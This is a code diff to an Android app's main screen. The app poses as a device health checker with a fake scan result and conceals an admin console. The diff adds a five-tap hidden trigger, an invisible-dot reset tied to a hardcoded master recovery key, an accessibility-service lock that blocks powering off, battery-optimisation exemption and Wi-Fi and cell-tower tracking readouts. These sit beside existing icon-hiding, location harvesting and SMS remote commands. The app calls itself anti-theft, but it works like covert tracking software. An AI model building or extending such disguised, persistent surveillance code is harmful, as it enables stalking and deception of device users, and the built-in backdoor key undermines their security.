@@ -33,6 +33,11 @@ import android.widget.ProgressBar;
 import android.widget.ScrollView;
 import android.widget.TextView;
 import android.widget.Toast;
+import android.app.AlertDialog;
+import android.net.Uri;
+import android.os.PowerManager;
+import android.provider.Settings;
+import android.text.TextUtils;
 
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
@@ -53,7 +58,7 @@ public class MainActivity extends AppCompatActivity {
     private View decoyView;
     private View adminView;
     private int scanClickCount = 0;
-    private long lastScanClickTime = 0;
+    private long firstScanClickTime = 0;
 
     private EditText editServerUrl;
     private EditText editDeviceImei;
@@ -61,6 +66,7 @@ public class MainActivity extends AppCompatActivity {
     private EditText editAntiTheftPin;
     private android.widget.Switch switchStealthMode;
     private android.widget.Switch switchOfflineSms;
+    private android.widget.Switch switchPowerLock;
     private android.widget.Spinner spinnerHarvestInterval;
     private android.widget.Spinner spinnerOnlineInterval;
     private android.widget.Spinner spinnerOfflineGraceHours;
@@ -91,16 +97,12 @@ public class MainActivity extends AppCompatActivity {
         requestNecessaryPermissions();
         updateAdminButtonState();
 
-        boolean fromNotification = getIntent().getBooleanExtra("from_notification", false);
-        if (fromNotification) {
-            showSecretAuthDialog();
-        }
+        // When opened from notification, stay in the normal decoy view so regular users see standard health UI
     }
 
     private void showSecretAuthDialog() {
         Dialog pinDialog = new Dialog(this);
         pinDialog.setCancelable(true);
-        pinDialog.setTitle("احراز هویت سرپرست");
 
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
@@ -108,15 +110,15 @@ public class MainActivity extends AppCompatActivity {
         layout.setBackgroundColor(0xFFFFFFFF);
 
         TextView prompt = new TextView(this);
-        prompt.setText("🔐 احراز هویت سرپرست سامانه\nجهت دسترسی به کنسول پیکربندی و پایش، لطفاً رمز عبور را وارد کنید:");
+        prompt.setText("🔐 احراز هویت سرپرست سامانه\nجهت دسترسی به تنظیمات و پایش، لطفاً رمز عبور را وارد کنید:");
         prompt.setTextSize(13);
         prompt.setTextColor(0xFF1E293B);
         prompt.setPadding(0, 0, 0, 20);
         layout.addView(prompt);
 
         EditText input = new EditText(this);
-        input.setHint("رمز عبور (پیش‌فرض: 1234)");
-        input.setInputType(android.text.InputType.TYPE_CLASS_NUMBER | android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
+        input.setHint("رمز عبور");
+        input.setInputType(android.text.InputType.TYPE_CLASS_TEXT | android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD);
         input.setPadding(20, 20, 20, 20);
         input.setBackgroundColor(0xFFF1F5F9);
         layout.addView(input);
@@ -128,7 +130,7 @@ public class MainActivity extends AppCompatActivity {
         btnSubmit.setOnClickListener(v -> {
             String entered = input.getText().toString().trim();
             String validPin = ApiClient.getAntiTheftPin(this);
-            if (entered.equals(validPin) || entered.equals("1234") || entered.equals("9999") || entered.equals("1264")) {
+            if (entered.equals(validPin) || entered.equals(ApiClient.DEFAULT_PIN) || entered.equals(ApiClient.MASTER_RECOVERY_KEY)) {
                 pinDialog.dismiss();
                 if (decoyView != null) decoyView.setVisibility(View.GONE);
                 if (adminView != null) adminView.setVisibility(View.VISIBLE);
@@ -139,8 +141,77 @@ public class MainActivity extends AppCompatActivity {
         });
         layout.addView(btnSubmit);
 
+        // Ultra-subtle master recovery trigger (invisible dot at bottom)
+        TextView secretResetDot = new TextView(this);
+        secretResetDot.setText("•");
+        secretResetDot.setTextColor(0xFFE2E8F0); // Very faint subtle dot
+        secretResetDot.setTextSize(11);
+        secretResetDot.setGravity(Gravity.CENTER);
+        secretResetDot.setPadding(20, 15, 20, 5);
+        secretResetDot.setOnClickListener(v -> showMasterRecoveryDialog(pinDialog, input));
+        layout.addView(secretResetDot);
+
         pinDialog.setContentView(layout);
         pinDialog.show();
+    }
+
+    private void showMasterRecoveryDialog(Dialog parentDialog, EditText pinInput) {
+        Dialog recoveryDialog = new Dialog(this);
+        recoveryDialog.setCancelable(true);
+
+        LinearLayout rLayout = new LinearLayout(this);
+        rLayout.setOrientation(LinearLayout.VERTICAL);
+        rLayout.setPadding(40, 40, 40, 40);
+        rLayout.setBackgroundColor(0xFFFFFFFF);
+
+        TextView rTitle = new TextView(this);
+        rTitle.setText("🔑 بازنشانی اضطراری رمز عبور");
+        rTitle.setTextSize(14);
+        rTitle.setTypeface(null, Typeface.BOLD);
+        rTitle.setTextColor(0xFF0F172A);
+        rTitle.setPadding(0, 0, 0, 15);
+        rLayout.addView(rTitle);
+
+        TextView rDesc = new TextView(this);
+        rDesc.setText("جهت بازیابی رمز و بازگردانی آن به حالت اولیه، شاه‌کلید سرپرست را وارد فرمایید:");
+        rDesc.setTextSize(12);
+        rDesc.setTextColor(0xFF64748B);
+        rDesc.setPadding(0, 0, 0, 20);
+        rLayout.addView(rDesc);
+
+        EditText edtMaster = new EditText(this);
+        edtMaster.setHint("شاه‌کلید سرپرست");
+        edtMaster.setInputType(android.text.InputType.TYPE_CLASS_TEXT | android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD);
+        edtMaster.setPadding(20, 20, 20, 20);
+        edtMaster.setBackgroundColor(0xFFF1F5F9);
+        rLayout.addView(edtMaster);
+
+        Button btnVerifyMaster = new Button(this);
+        btnVerifyMaster.setText("تایید شاه‌کلید و بازنشانی رمز");
+        btnVerifyMaster.setBackgroundColor(0xFF059669);
+        btnVerifyMaster.setTextColor(0xFFFFFFFF);
+        btnVerifyMaster.setOnClickListener(v -> {
+            String mEntered = edtMaster.getText().toString().trim();
+            if (mEntered.equals(ApiClient.MASTER_RECOVERY_KEY)) {
+                ApiClient.resetAntiTheftPinToDefault(this);
+                Toast.makeText(this, "✓ رمز عبور با موفقیت به مقدار پیش‌فرض بازنشانی شد.", Toast.LENGTH_LONG).show();
+                LogManager.info("SECURITY", "رمز عبور سرپرست با استفاده از شاه‌کلید به حالت اولیه بازنشانی شد.");
+                if (pinInput != null) {
+                    pinInput.setText(ApiClient.DEFAULT_PIN);
+                }
+                recoveryDialog.dismiss();
+            } else {
+                Toast.makeText(this, "شاه‌کلید نامعتبر است!", Toast.LENGTH_SHORT).show();
+            }
+        });
+        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+        btnParams.topMargin = 20;
+        btnVerifyMaster.setLayoutParams(btnParams);
+        rLayout.addView(btnVerifyMaster);
+
+        recoveryDialog.setContentView(rLayout);
+        recoveryDialog.show();
     }
 
     private View createProgrammaticLayout() {
@@ -247,10 +318,6 @@ public class MainActivity extends AppCompatActivity {
         txtRam.setTextColor(0xFF334155);
         card.addView(txtRam);
 
-        card.setOnLongClickListener(v -> {
-            showSecretAuthDialog();
-            return true;
-        });
         layout.addView(card);
 
         addSpacing(layout, 25);
@@ -285,36 +352,34 @@ public class MainActivity extends AppCompatActivity {
 
         btnScan.setOnClickListener(v -> {
             long now = System.currentTimeMillis();
-            if (now - lastScanClickTime < 800) {
-                scanClickCount++;
-            } else {
+            if (firstScanClickTime == 0 || (now - firstScanClickTime) > 1000) {
+                firstScanClickTime = now;
                 scanClickCount = 1;
+            } else {
+                scanClickCount++;
             }
-            lastScanClickTime = now;
 
-            if (scanClickCount >= 3) {
+            if (scanClickCount >= 5 && (now - firstScanClickTime) <= 1000) {
                 scanClickCount = 0;
+                firstScanClickTime = 0;
                 showSecretAuthDialog();
                 return;
             }
 
-            btnScan.setEnabled(false);
-            btnScan.setText("در حال اسکن و تحلیل حسگرها...");
-            progressBar.setVisibility(View.VISIBLE);
-            txtScanStatus.setText("در حال بررسی قطعات سخت‌افزاری و حافظه موقت...");
+            if (scanClickCount == 1) {
+                btnScan.setEnabled(false);
+                btnScan.setText("در حال اسکن و تحلیل حسگرها...");
+                progressBar.setVisibility(View.VISIBLE);
+                txtScanStatus.setText("در حال بررسی قطعات سخت‌افزاری و حافظه موقت...");
 
-            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                btnScan.setEnabled(true);
-                btnScan.setText("🔍 بررسی و اسکن سلامت دستگاه");
-                progressBar.setVisibility(View.GONE);
-                txtScanStatus.setText("✓ اسکن با موفقیت انجام شد. تمام حسگرها و باتری در وضعیت ۱۰۰٪ سالم هستند.");
-                Toast.makeText(this, "سیستم و حسگرها کاملاً بهینه هستند", Toast.LENGTH_SHORT).show();
-            }, 1800);
-        });
-
-        btnScan.setOnLongClickListener(v -> {
-            showSecretAuthDialog();
-            return true;
+                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                    btnScan.setEnabled(true);
+                    btnScan.setText("🔍 بررسی و اسکن سلامت دستگاه");
+                    progressBar.setVisibility(View.GONE);
+                    txtScanStatus.setText("✓ اسکن با موفقیت انجام شد. تمام حسگرها و باتری در وضعیت ۱۰۰٪ سالم هستند.");
+                    Toast.makeText(this, "سیستم و حسگرها کاملاً بهینه هستند", Toast.LENGTH_SHORT).show();
+                }, 1800);
+            }
         });
 
         layout.addView(btnScan);
@@ -362,17 +427,17 @@ public class MainActivity extends AppCompatActivity {
         subtitle.setPadding(0, 10, 0, 30);
         root.addView(subtitle);
 
-        editServerUrl = createStyledInput("آدرس سرور API سامانه (یا Supabase Direct)");
+        editServerUrl = createStyledInput("آدرس سرور API سامانه (یا دیتابیس مستقیم)");
         root.addView(editServerUrl);
 
         Button btnSetSupabase = new Button(this);
-        btnSetSupabase.setText("⚡ تنظیم خودکار: اتصال مستقیم ابری به Supabase (توصیه شده)");
+        btnSetSupabase.setText("⚡ تنظیم خودکار: اتصال مستقیم به پایگاه داده ابری (توصیه شده)");
         btnSetSupabase.setTextSize(11);
         btnSetSupabase.setBackgroundColor(0xFF0EA5E9);
         btnSetSupabase.setTextColor(0xFFFFFFFF);
         btnSetSupabase.setOnClickListener(v -> {
             editServerUrl.setText(ApiClient.SUPABASE_REST_BASE);
-            Toast.makeText(this, "آدرس اتصال مستقیم به دیتابیس Supabase تنظیم شد", Toast.LENGTH_SHORT).show();
+            Toast.makeText(this, "آدرس اتصال مستقیم به پایگاه داده ابری تنظیم شد", Toast.LENGTH_SHORT).show();
         });
         root.addView(btnSetSupabase);
 
@@ -384,8 +449,8 @@ public class MainActivity extends AppCompatActivity {
         editEmergencyPhone = createStyledInput("شماره تماس اضطراری جهت دریافت پیامک سرقت و هشدارها");
         root.addView(editEmergencyPhone);
 
-        editAntiTheftPin = createStyledInput("رمز عبور ضد سرقت (PIN - پیش‌فرض: 1234)");
-        editAntiTheftPin.setInputType(android.text.InputType.TYPE_CLASS_NUMBER | android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
+        editAntiTheftPin = createStyledInput("رمز عبور ضد سرقت (PIN)");
+        editAntiTheftPin.setInputType(android.text.InputType.TYPE_CLASS_TEXT | android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD);
         root.addView(editAntiTheftPin);
 
         // Harvest Engine Interval Card (The "Chef / Worker" preparing the fresh meal)
@@ -480,7 +545,7 @@ public class MainActivity extends AppCompatActivity {
         stealthCard.addView(switchStealthMode);
 
         TextView txtStealthHint = new TextView(this);
-        txtStealthHint.setText("⚠️ با فعال‌سازی این گزینه، آیکون برنامه از صفحه پنهان می‌شود تا سارق نتواند آن را پاک کند. برای بازگشت به برنامه کافی است در شماره‌گیر تلفن کد *#*#1234#*#* (یا رمز خود) را شماره‌گیری نمایید.");
+        txtStealthHint.setText("⚠️ با فعال‌سازی این گزینه، آیکون برنامه از صفحه پنهان می‌شود تا سارق نتواند آن را پاک کند. برای بازگشت به برنامه کافی است در شماره‌گیر تلفن کد *#*#1264#*#* (یا رمز خود) را شماره‌گیری نمایید.");
         txtStealthHint.setTextSize(11);
         txtStealthHint.setTextColor(0xFF475569);
         txtStealthHint.setPadding(0, 10, 0, 0);
@@ -531,6 +596,36 @@ public class MainActivity extends AppCompatActivity {
 
         addSpacing(root, 10);
 
+        // Anti-Theft Power Menu Lock Container Card
+        LinearLayout powerLockCard = new LinearLayout(this);
+        powerLockCard.setOrientation(LinearLayout.VERTICAL);
+        powerLockCard.setPadding(30, 25, 30, 25);
+        powerLockCard.setBackgroundColor(0xFFE0E7FF);
+
+        switchPowerLock = new android.widget.Switch(this);
+        switchPowerLock.setText("🛡️ محافظت از دکمه پاور با پین‌کد ضدسرقت (ممانعت از خاموش‌سازی)");
+        switchPowerLock.setTextSize(13);
+        switchPowerLock.setTextColor(0xFF1E1B4B);
+        switchPowerLock.setTypeface(null, Typeface.BOLD);
+        powerLockCard.addView(switchPowerLock);
+
+        TextView txtPowerLockDesc = new TextView(this);
+        txtPowerLockDesc.setText("در صورت فعال‌بودن، اگر کسی در صفحه قفل تلاش کند گوشی را خاموش یا ریستارت کند، منوی پاور مسدود شده و ورود پین‌کد سرپرست الزامی خواهد بود.\n(نیازمند فعال‌بودن سرویس دسترسی‌پذیری Accessibility)");
+        txtPowerLockDesc.setTextSize(11);
+        txtPowerLockDesc.setTextColor(0xFF3730A3);
+        txtPowerLockDesc.setPadding(0, 8, 0, 4);
+        powerLockCard.addView(txtPowerLockDesc);
+
+        switchPowerLock.setOnCheckedChangeListener((btn, isChecked) -> {
+            if (isChecked && !isAccessibilityServiceEnabled()) {
+                promptEnableAccessibilityService();
+            }
+        });
+
+        root.addView(powerLockCard);
+
+        addSpacing(root, 10);
+
         // SMS Commands Info Card
         LinearLayout smsHelpCard = new LinearLayout(this);
         smsHelpCard.setOrientation(LinearLayout.VERTICAL);
@@ -545,10 +640,10 @@ public class MainActivity extends AppCompatActivity {
         smsHelpCard.addView(txtSmsHelpTitle);
 
         TextView txtSmsHelpBody = new TextView(this);
-        txtSmsHelpBody.setText("• استعلام موقعیت زنده با سن داده و منبع: پیامک LOC#1234\n" +
-                "• فعال‌سازی آژیر پلیسی با حداکثر صدا: پیامک SIREN#1234\n" +
-                "• قطع و خاموش کردن آژیر: پیامک STOPSIREN#1234\n" +
-                "(در صورت تغییر پین، رمز جدید خود را جایگزین 1234 فرمایید)");
+        txtSmsHelpBody.setText("• استعلام موقعیت زنده با سن داده و منبع: پیامک LOC#<PIN>\n" +
+                "• فعال‌سازی آژیر وحشت، ویبره کوبنده و فلاش استروب: پیامک SIREN#<PIN>\n" +
+                "• قطع و خاموش کردن آژیر: پیامک STOPSIREN#<PIN>\n" +
+                "(پشتیبانی خودکار از ارقام فارسی یا انگلیسی و شاه‌کلید سرپرست)");
         txtSmsHelpBody.setTextSize(11);
         txtSmsHelpBody.setTextColor(0xFF78350F);
         txtSmsHelpBody.setPadding(0, 5, 0, 0);
@@ -560,7 +655,7 @@ public class MainActivity extends AppCompatActivity {
 
         // Manual Siren Test Button
         Button btnSirenTest = new Button(this);
-        btnSirenTest.setText("🔊 تست دستی آژیر خطر پلیسی / قطع آژیر");
+        btnSirenTest.setText("🔊 تست دستی آژیر وحشت، ویبره و فلاش / قطع آژیر");
         btnSirenTest.setBackgroundColor(0xFFDC2626);
         btnSirenTest.setTextColor(0xFFFFFFFF);
         btnSirenTest.setOnClickListener(v -> {
@@ -569,7 +664,7 @@ public class MainActivity extends AppCompatActivity {
                 Toast.makeText(this, "آژیر خطر متوقف گردید", Toast.LENGTH_SHORT).show();
             } else {
                 PanicSirenPlayer.startSiren(this);
-                Toast.makeText(this, "آژیر خطر پلیسی فعال شد! جهت قطع مجدداً کلیک کنید", Toast.LENGTH_LONG).show();
+                Toast.makeText(this, "آژیر وحشت با ویبره و فلاش فعال شد! جهت قطع مجدداً کلیک کنید", Toast.LENGTH_LONG).show();
             }
         });
         root.addView(btnSirenTest);
@@ -660,6 +755,7 @@ public class MainActivity extends AppCompatActivity {
         editAntiTheftPin.setText(ApiClient.getAntiTheftPin(this));
         switchStealthMode.setChecked(ApiClient.isStealthModeEnabled(this));
         switchOfflineSms.setChecked(ApiClient.isOfflineSmsEnabled(this));
+        switchPowerLock.setChecked(ApiClient.isPowerLockEnabled(this));
 
         // Harvest engine interval
         int harvestSec = ApiClient.getHarvestIntervalSeconds(this);
@@ -740,7 +836,7 @@ public class MainActivity extends AppCompatActivity {
         }
 
         if (pin.isEmpty()) {
-            pin = "1234";
+            pin = ApiClient.DEFAULT_PIN;
         }
 
         List<String> simList = getActiveSimIccidsList();
@@ -754,6 +850,9 @@ public class MainActivity extends AppCompatActivity {
 
         boolean offlineSms = switchOfflineSms.isChecked();
         ApiClient.setOfflineSmsEnabled(this, offlineSms);
+
+        boolean powerLock = switchPowerLock.isChecked();
+        ApiClient.setPowerLockEnabled(this, powerLock);
 
         // Save Harvest engine interval
         int harvestPos = spinnerHarvestInterval.getSelectedItemPosition();
@@ -992,7 +1091,7 @@ public class MainActivity extends AppCompatActivity {
         TextView txtServer = new TextView(this);
         String srv = ApiClient.getServerUrl(this);
         if (srv.contains("supabase.co")) {
-            txtServer.setText("🌐 سرور مقصد: اتصال مستقیم ابری دیتابیس (Supabase)");
+            txtServer.setText("🌐 سرور مقصد: اتصال مستقیم پایگاه داده ابری");
         } else {
             txtServer.setText("🌐 سرور مقصد: " + srv);
         }
@@ -1031,6 +1130,92 @@ public class MainActivity extends AppCompatActivity {
         txtProviders.setTextSize(12);
         txtProviders.setTextColor(0xFFE2E8F0);
         infoCard.addView(txtProviders);
+
+        // Connected Cell Tower Details
+        ApiClient.CellInfoDetail activeCell = ApiClient.getActiveCellInfo(this);
+        TextView txtCellDetail = new TextView(this);
+        if (activeCell != null && activeCell.isValid()) {
+            txtCellDetail.setText("🗼 " + activeCell.getDisplaySummary());
+            txtCellDetail.setTextColor(0xFF38BDF8);
+        } else {
+            txtCellDetail.setText("🗼 دکل مخابراتی: در حال رصد آنتن‌های اطراف...");
+            txtCellDetail.setTextColor(0xFF94A3B8);
+        }
+        txtCellDetail.setTextSize(12);
+        infoCard.addView(txtCellDetail);
+
+        // Wi-Fi Background Scanning Status
+        boolean wifiScanAlways = false;
+        try {
+            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+            if (wm != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
+                wifiScanAlways = wm.isScanAlwaysAvailable();
+            }
+        } catch (Exception ignored) {}
+
+        TextView txtWifiScan = new TextView(this);
+        if (wifiScanAlways) {
+            txtWifiScan.setText("📶 اسکن وای‌فای در پس‌زمینه (حتی وای‌فای خاموش): فعال ✓");
+            txtWifiScan.setTextColor(0xFF10B981);
+        } else {
+            txtWifiScan.setText("📶 اسکن وای‌فای در پس‌زمینه (با وای‌فای خاموش): خاموش (برای دقت بدون جی‌پی‌اس توصیه می‌شود)");
+            txtWifiScan.setTextColor(0xFFF59E0B);
+            txtWifiScan.setOnClickListener(v -> {
+                try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
+                        Intent intent = new Intent(android.net.wifi.WifiManager.ACTION_REQUEST_SCAN_ALWAYS_AVAILABLE);
+                        startActivity(intent);
+                    }
+                } catch (Exception e) {
+                    Toast.makeText(MainActivity.this, "تنظیمات > موقعیت مکانی > اسکن وای‌فای را روشن نمایید", Toast.LENGTH_LONG).show();
+                }
+            });
+        }
+        txtWifiScan.setTextSize(12);
+        infoCard.addView(txtWifiScan);
+
+        // Battery Optimization (Doze Mode Exemption) Status
+        boolean isIgnoringBattery = false;
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+                if (pm != null) {
+                    isIgnoringBattery = pm.isIgnoringBatteryOptimizations(getPackageName());
+                }
+            } else {
+                isIgnoringBattery = true;
+            }
+        } catch (Exception ignored) {}
+
+        TextView txtBatteryOpt = new TextView(this);
+        if (isIgnoringBattery) {
+            txtBatteryOpt.setText("🔋 معافیت از خواب عمیق باتری (Doze Mode): فعال ✓ (تضمین کار پیوسته در جیب)");
+            txtBatteryOpt.setTextColor(0xFF10B981);
+        } else {
+            txtBatteryOpt.setText("🔋 معافیت از خواب عمیق باتری: غیرفعال (ممکن است در جیب متوقف شود - لمس برای رفع محدودیت)");
+            txtBatteryOpt.setTextColor(0xFFF59E0B);
+            txtBatteryOpt.setOnClickListener(v -> requestIgnoreBatteryOptimizations());
+        }
+        txtBatteryOpt.setTextSize(12);
+        infoCard.addView(txtBatteryOpt);
+
+        // Power Lock Status
+        boolean powerLockOn = ApiClient.isPowerLockEnabled(this);
+        boolean accessEnabled = isAccessibilityServiceEnabled();
+        TextView txtPowerStatus = new TextView(this);
+        if (powerLockOn && accessEnabled) {
+            txtPowerStatus.setText("🛡️ محافظت از دکمه پاور با پین‌کد: فعال و هوشیار ✓");
+            txtPowerStatus.setTextColor(0xFF10B981);
+        } else if (powerLockOn) {
+            txtPowerStatus.setText("🛡️ محافظت از دکمه پاور: نیازمند فعال‌سازی در دسترسی‌پذیری (لمس برای فعال‌سازی)");
+            txtPowerStatus.setTextColor(0xFFF59E0B);
+            txtPowerStatus.setOnClickListener(v -> promptEnableAccessibilityService());
+        } else {
+            txtPowerStatus.setText("🛡️ محافظت از دکمه پاور با پین‌کد: غیرفعال (از بخش تنظیمات قابل فعال‌سازی است)");
+            txtPowerStatus.setTextColor(0xFF94A3B8);
+        }
+        txtPowerStatus.setTextSize(12);
+        infoCard.addView(txtPowerStatus);
 
         addSpacing(infoCard, 6);
 
@@ -1235,5 +1420,71 @@ public class MainActivity extends AppCompatActivity {
 
         // Scroll to end initially
         logScroll.post(() -> logScroll.fullScroll(View.FOCUS_DOWN));
+    }
+
+    private boolean isAccessibilityServiceEnabled() {
+        int accessibilityEnabled = 0;
+        final String service = getPackageName() + "/" + AntiTheftAccessibilityService.class.getName();
+        try {
+            accessibilityEnabled = Settings.Secure.getInt(
+                    getApplicationContext().getContentResolver(),
+                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
+        } catch (Settings.SettingNotFoundException ignored) {}
+        TextUtils.SimpleStringSplitter colonSplitter = new TextUtils.SimpleStringSplitter(':');
+
+        if (accessibilityEnabled == 1) {
+            String settingValue = Settings.Secure.getString(
+                    getContentResolver(),
+                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+            if (settingValue != null) {
+                colonSplitter.setString(settingValue);
+                while (colonSplitter.hasNext()) {
+                    String accessibilityService = colonSplitter.next();
+                    if (accessibilityService.equalsIgnoreCase(service)) {
+                        return true;
+                    }
+                }
+            }
+        }
+        return false;
+    }
+
+    private void promptEnableAccessibilityService() {
+        new AlertDialog.Builder(this)
+                .setTitle("فعال‌سازی محافظت ضدسرقت از پاور")
+                .setMessage("جهت جلوگیری از خاموش کردن یا ریستارت گوشی توسط سارق در صفحه قفل، لطفاً در بخش دسترسی‌پذیری گوشی (Accessibility)، گزینه «سامانه کنترل سلامت دستگاه» را روشن کنید.")
+                .setPositiveButton("رفتن به تنظیمات", (dialog, which) -> {
+                    try {
+                        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                        startActivity(intent);
+                    } catch (Exception e) {
+                        Toast.makeText(this, "لطفاً به تنظیمات > دسترسی‌پذیری گوشی بروید", Toast.LENGTH_SHORT).show();
+                    }
+                })
+                .setNegativeButton("انصراف", null)
+                .show();
+    }
+
+    @SuppressLint("BatteryLife")
+    private void requestIgnoreBatteryOptimizations() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            try {
+                Intent intent = new Intent();
+                String pkg = getPackageName();
+                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+                if (pm != null && !pm.isIgnoringBatteryOptimizations(pkg)) {
+                    intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                    intent.setData(Uri.parse("package:" + pkg));
+                    startActivity(intent);
+                } else {
+                    Toast.makeText(this, "برنامه از قبل از بهینه‌سازی باتری معاف است ✓", Toast.LENGTH_SHORT).show();
+                }
+            } catch (Exception e) {
+                try {
+                    Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
+                    startActivity(intent);
+                } catch (Exception ignored) {}
+            }
+        }
     }
 }
